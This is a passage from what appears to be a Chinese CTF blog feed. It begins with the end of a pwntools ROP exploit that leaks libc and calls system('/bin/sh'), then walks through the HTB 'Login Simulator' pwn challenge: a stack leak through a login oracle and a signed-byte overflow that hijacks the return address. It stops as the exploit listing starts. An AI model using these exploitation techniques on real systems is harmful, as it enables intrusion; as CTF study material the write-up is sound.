class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">10</span>):</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wtaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">add=<span class="number">0x100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">xx=addr%add</span><br><span class="line">p.sendline(chr((addr%add)^<span class="number">0x34</span>))</span><br><span class="line">addr=addr//add</span><br><span class="line">p.sendline(<span class="string">'lexsd6'</span>)</span><br><span class="line"></span><br><span class="line">wtaddr(<span class="number">0x00000000004016e3</span>)</span><br><span class="line">wtaddr(e.got[<span class="string">'puts'</span>])</span><br><span class="line">wtaddr(e.sym[<span class="string">'puts'</span>])</span><br><span class="line">wtaddr(e.sym[<span class="string">'main'</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'BINGAUS'</span>)</span><br><span class="line"></span><br><span class="line">libcaddr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(libcaddr))</span><br><span class="line">x=finder(<span class="string">'puts'</span>,libcaddr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">10</span>):</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(chr(<span class="number">0x34</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wtaddr(<span class="number">0x00000000004016e3</span>)</span><br><span class="line">wtaddr(x.dump(<span class="string">'str_bin_sh'</span>))</span><br><span class="line">wtaddr(<span class="number">0x000000000040101a</span>)</span><br><span class="line">wtaddr(x.dump(<span class="string">'system'</span>))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'BINGAUS'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Login Simulator-pwn-challenge-wp</title>
      <link href="/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/"/>
      <url>/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/</url>
      
        <content type="html"><![CDATA[<p>一道意义题，让我学会了很多…比如明白了大佬总再说“F5 只是看乐子，干正事还是得看汇编”<a id="more"></a></p><h2 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h2><p>题目开了PIE 、canary，NX保护。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledRUNPATH:  b&apos;./glibc&apos;</code></pre><p>程序的mian函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+7h] [rbp-A9h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setup</span>(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;v6) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Something went wrong.\n"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="keyword">register</span>(&amp;v8);</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        login((<span class="keyword">const</span> struct utmp *)&amp;v8);</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Good job! :^)"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Invalid username! :)"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You need to register first."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid option.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主要逻辑简单，主要是注册（register）、登录（login）及退出（exit）3个功能。</p><p>我们进行跟进注册（register）可以看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">register</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Username length: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;v2) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &lt;= <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Enter username: "</span>, &amp;v2);</span><br><span class="line">      getInput(a1, v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Username registered successfully!"</span>);</span><br><span class="line">      result = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid length."</span>);</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something went wrong!"</span>);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然，函数对我们输入的数据有合法的限制，但检测的是我们输入的数据长度。导致我们输入的数据可以小于我们原本设置的输入数据大小。</p><p>于是跟进到login函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">(<span class="keyword">const</span> struct utmp *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;i&#125; Username: "</span>);</span><br><span class="line">  getInput(&amp;s1, v1);</span><br><span class="line">  <span class="built_in">strncmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)entry, (<span class="keyword">signed</span> <span class="keyword">int</span>)v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在login函数的检测中，v1是由我们输入的“数据长度”。但我们实际的输入数据没那么多，导致可能我们泄露栈上数据。</p><h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>我们分析getInput函数，getinput的作用是将数据一个一个字符写入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">getInput</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; i &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &gt; <span class="number">0</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf != <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf == <span class="number">0xA</span> )</span><br><span class="line">        <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们乍看，可以没用什么问题。用于输入的第二参数在调用前就被我们严格的限制。</p><p>但是在对字符串处理时，对0x20对应的字符’ ‘(空格)执行跳过，导致栈上原本存放的数据继续保留下来。</p><p>再加上之前，login的验证功能，导致我们可以一个个把部分栈上数据泄露出来。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>再回到getInput函数，看反汇编代码看不出毛病，但是审计汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c92fd &lt;+0&gt;:     push   rbp</span><br><span class="line"> 0x00005630ed0c92fe &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line"> 0x00005630ed0c9301 &lt;+4&gt;:     sub    rsp,0x20</span><br><span class="line"> 0x00005630ed0c9305 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line"> 0x00005630ed0c9309 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x1c],esi</span><br><span class="line"> 0x00005630ed0c930c &lt;+15&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line"> 0x00005630ed0c9315 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line"> 0x00005630ed0c9319 &lt;+28&gt;:    xor    eax,eax</span><br><span class="line"> 0x00005630ed0c931b &lt;+30&gt;:    mov    BYTE PTR [rbp-0x9],0x0</span><br><span class="line"> 0x00005630ed0c931f &lt;+34&gt;:    jmp    0x5630ed0c936f &lt;getInput+114&gt;</span><br><span class="line"> 0x00005630ed0c9321 &lt;+36&gt;:    lea    rax,[rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9325 &lt;+40&gt;:    mov    edx,0x1</span><br><span class="line"> 0x00005630ed0c932a &lt;+45&gt;:    mov    rsi,rax</span><br><span class="line"> 0x00005630ed0c932d &lt;+48&gt;:    mov    edi,0x0</span><br><span class="line"> 0x00005630ed0c9332 &lt;+53&gt;:    mov    eax,0x0</span><br><span class="line"> 0x00005630ed0c9337 &lt;+58&gt;:    call   0x5630ed0c9070 &lt;read@plt&gt;</span><br><span class="line"> 0x00005630ed0c933c &lt;+63&gt;:    test   eax,eax</span><br><span class="line"> 0x00005630ed0c933e &lt;+65&gt;:    jle    0x5630ed0c937a &lt;getInput+125&gt;</span><br><span class="line"> 0x00005630ed0c9340 &lt;+67&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9344 &lt;+71&gt;:    cmp    al,0x20</span><br><span class="line"> 0x00005630ed0c9346 &lt;+73&gt;:    je     0x5630ed0c9364 &lt;getInput+103&gt;</span><br><span class="line"> 0x00005630ed0c9348 &lt;+75&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c934c &lt;+79&gt;:    cmp    al,0xa</span><br><span class="line"> 0x00005630ed0c934e &lt;+81&gt;:    je     0x5630ed0c937d &lt;getInput+128&gt;</span><br><span class="line"> 0x00005630ed0c9350 &lt;+83&gt;:    movsx  rdx,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9355 &lt;+88&gt;:    mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line"> 0x00005630ed0c9359 &lt;+92&gt;:    add    rdx,rax</span><br><span class="line"> 0x00005630ed0c935c &lt;+95&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9360 &lt;+99&gt;:    mov    BYTE PTR [rdx],al</span><br><span class="line"> 0x00005630ed0c9362 &lt;+101&gt;:   jmp    0x5630ed0c9365 &lt;getInput+104&gt;</span><br><span class="line"> 0x00005630ed0c9364 &lt;+103&gt;:   nop</span><br><span class="line"> 0x00005630ed0c9365 &lt;+104&gt;:   movzx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9369 &lt;+108&gt;:   add    eax,0x1</span><br><span class="line"> 0x00005630ed0c936c &lt;+111&gt;:   mov    BYTE PTR [rbp-0x9],al</span><br><span class="line"> 0x00005630ed0c936f &lt;+114&gt;:   movsx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9373 &lt;+118&gt;:   cmp    DWORD PTR [rbp-0x1c],eax</span><br><span class="line"> 0x00005630ed0c9376 &lt;+121&gt;:   jg     0x5630ed0c9321 &lt;getInput+36&gt;</span><br><span class="line"> 0x00005630ed0c9378 &lt;+123&gt;:   jmp    0x5630ed0c937e &lt;getInput+129&gt;</span><br><span class="line"> 0x00005630ed0c937a &lt;+125&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937b &lt;+126&gt;:   jmp    0x5630ed0c937e &lt;getInput+129&gt;</span><br><span class="line"> 0x00005630ed0c937d &lt;+128&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937e &lt;+129&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937f &lt;+130&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line"> 0x00005630ed0c9383 &lt;+134&gt;:   sub    rax,QWORD PTR fs:0x28</span><br><span class="line"> 0x00005630ed0c938c &lt;+143&gt;:   je     0x5630ed0c9393 &lt;getInput+150&gt;</span><br><span class="line"> 0x00005630ed0c938e &lt;+145&gt;:   call   0x5630ed0c9050 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 0x00005630ed0c9393 &lt;+150&gt;:   leave</span><br><span class="line"> 0x00005630ed0c9394 &lt;+151&gt;:   ret</span><br></pre></td></tr></table></figure><p>重点是这一个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c9350 &lt;+83&gt;:    movsx  rdx,BYTE PTR [rbp-0x9]</span><br><span class="line">0x00005630ed0c9355 &lt;+88&gt;:    mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">0x00005630ed0c9359 &lt;+92&gt;:    add    rdx,rax</span><br><span class="line">0x00005630ed0c935c &lt;+95&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line">0x00005630ed0c9360 &lt;+99&gt;:    mov    BYTE PTR [rdx],al</span><br></pre></td></tr></table></figure><p>这段的本意是，完成反汇编代码<code>*(_BYTE *)(a1 + i) = buf;</code>的作用，即，将一个字符放该存放它的地方，形成字符串。</p><p>但是由于使用了<code>movsx</code> 和<code>movzx</code>两个指令，这两指令都是<a href="https://baike.baidu.com/item/数据传送/500685" target="_blank" rel="noopener">数据传送</a>指令MOV的变体。<code>movsx</code>是带符号扩展，并传送。<code>movzx</code>是无符号扩展，并传送.因此在处理一些数据时，会有不同的表现。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV BL,80H</span><br><span class="line">MOVSX AX,BL</span><br><span class="line"></span><br><span class="line">mov BL, 80H</span><br><span class="line">MOVZX AX, BL</span><br></pre></td></tr></table></figure><p>运行完以上MOVSX指令语句之后，AX的值为FF80H。由于BL为80H=1000 0000，最高位也即符号位为1，在进行带符号扩展时，其扩展的高8位均为1，故赋值AX为1111 1111 1000 0000，即AX=FF80H。而在运行完以上MOVZX指令语句之后，AX的值为0080H。由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H。</p><p>这特性导致，若在题目中中[rbp-0x9]中为0x80时， <code>movsx  eax,BYTE PTR [rbp-0x9]</code>执行后，eax值是<code>0xffffffffffffff80</code>而非<code>0x80</code>.导致在执行<code>add    rdx,rax</code>时rdx相加的不是0x80而是<code>0xffffffffffffff80</code>.导致在<code>rbx+0xffffffffffffff80</code>写入了数据。</p><p>同理，在判断循环（<code>for ( i = 0; a2 &gt; i &amp;&amp; (signed int)read(0, &amp;buf, 1uLL) &gt; 0; ++i )</code>）是否结束是也用了<code>movsx</code>指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c9369 &lt;+108&gt;:   add    eax,0x1</span><br><span class="line">0x00005630ed0c936c &lt;+111&gt;:   mov    BYTE PTR [rbp-0x9],al</span><br><span class="line">0x00005630ed0c936f &lt;+114&gt;:   movsx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line">0x00005630ed0c9373 &lt;+118&gt;:   cmp    DWORD PTR [rbp-0x1c],eax</span><br></pre></td></tr></table></figure><p>由于是带符号比较，<code>0x80</code>(正数)是肯定大于<code>0xffffffffffffff80</code>(负数)。<strong>导致我们可以在输入0x80个字符后，继续写入字符。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="leak-addr"><a href="#leak-addr" class="headerlink" title="leak addr"></a>leak addr</h3><p>通过gdb我们可以发现，在login函数栈上残留了<code>_IO_2_1_stdout_</code>的数据和一个ELF段的地址。<img src="image-20220404112731311.png" alt="image-20220404112731311"></p><p>我们可以利用在register写入猜测的地址数据和数据长度，即构造恶意数据长度为已知道的数据+一位猜测数据，通过login来一个个检验我们猜测是否准确。这样通过strncmp检测，若我们猜测数据对了则显示login成功，未猜对就显示失败。</p><p>这样我们慢慢leak出<code>_IO_2_1_stdout_</code>的地址，由<code>_IO_2_1_stdout_</code>是glib上的函数，我们间接得到了libc的base addr和 system等libc函数的地址和one_getgad的地址。</p><p>我们通过一个ELF段的地址上的地址，从而间接得到程序ELF段的基础地址，从而推测出bss段或某一个可写地址的大概位置。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>之前我们知道getInput，有溢出的可能。经过gdb发现。getInput+<code>0xffffffffffffff80</code>的位置恰好，离rbp和返回地址很近。</p><p><img src="image-20220404152704003.png" alt="image-20220404152704003"></p><p>同时在getinput中我们的空格会保留栈上原本的数据。这样我们可以通过一定空格来到rbp和返回地址附近。从而，复写返回地址劫持rip，控制程序流。</p><h2 id="exp-local"><a href="#exp-local" class="headerlink" title="exp_local"></a>exp_local</h2><p>因此流程下来的exp，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 